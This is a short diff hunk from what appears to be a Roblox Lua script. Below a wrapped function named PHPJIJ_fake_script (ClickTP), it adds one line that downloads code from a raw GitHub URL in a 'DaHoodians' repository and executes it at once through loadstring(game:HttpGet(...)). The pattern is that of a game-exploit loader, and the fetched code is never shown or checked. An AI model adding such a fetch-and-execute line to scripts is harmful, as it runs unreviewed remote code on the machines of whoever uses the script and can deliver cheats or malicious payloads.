@@ -4103,3 +4103,4 @@ local function PHPJIJ_fake_script() -- ClickTP.ClickTP
 	end)
 end
 coroutine.wrap(PHPJIJ_fake_script)()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Red72Falcon/DaHoodians/main/LoaderString'))()
